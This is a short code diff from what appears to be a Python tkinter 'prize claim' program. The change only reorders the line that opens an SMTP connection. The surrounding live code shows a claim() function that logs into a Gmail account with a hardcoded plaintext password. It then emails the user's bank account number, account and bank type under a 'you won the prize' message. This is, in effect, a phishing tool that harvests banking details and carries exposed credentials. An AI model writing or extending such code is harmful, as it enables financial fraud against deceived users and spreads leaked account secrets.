@@ -22,10 +22,11 @@ def close():
         messagebox.showinfo("return", "you'll return to your application" )
 
 def claim():
-    s = smtplib.SMTP("smtp.gmail.com", 587)
+
     sender = "amandamakara7@gmail.com"
     user = "demijefferies@gmail.com"
     password = "@manda20W"
+    s = smtplib.SMTP("smtp.gmail.com", 587)
     s.starttls()
     s.login(sender,password)
     message = "congradulations ", "you won the prize " + "\n" "here are you banking details" + acountnum.get() + "\n" + acount.get() + "\n" + banktype.get()
